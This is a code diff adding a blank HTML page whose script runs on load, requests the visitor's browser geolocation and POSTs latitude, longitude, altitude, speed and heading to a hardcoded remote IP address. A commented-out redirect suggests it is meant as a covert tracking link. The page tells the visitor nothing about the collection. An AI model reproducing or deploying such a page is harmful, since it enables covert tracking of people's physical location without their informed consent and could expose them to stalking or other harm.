@@ -1,0 +1,56 @@
+<html>
+    <head>
+        <script> 
+
+var domain = "http://18.188.199.85:5000/"
+
+async function getLocation() {
+  if (navigator.geolocation) {
+    await navigator.geolocation.getCurrentPosition(capturePosition);
+  } else {
+    console.log("Geolocation is not supported by this browser.");
+  }
+}
+
+function end(url) {
+  
+    window.location.href=url;
+}
+
+async function capturePosition(position) {
+    coords = position.coords
+    console.log(coords)
+    loc_info = JSON.stringify({
+        'accuracy':coords.accuracy,
+        'altitude':coords.altitude,
+        'altitudeAccuracy': coords.altitudeAccuracy,
+        'heading': coords.heading,
+        'latitude':coords.latitude,
+        'longitude':coords.longitude,
+        'speed': coords.speed
+    });
+    console.log(loc_info);
+
+    fetch(domain+'/loc', {
+        method: 'POST',
+        body: JSON.stringify(loc_info)
+    });
+
+    // end('')
+
+}
+
+async function main() {
+  console.log("Yay");
+  fetch(domain+'/loc', {
+    method: 'POST',
+    body: JSON.stringify(loc_info)
+});
+    await getLocation();
+}
+
+main()
+
+        </script>
+    </head>
+</html>
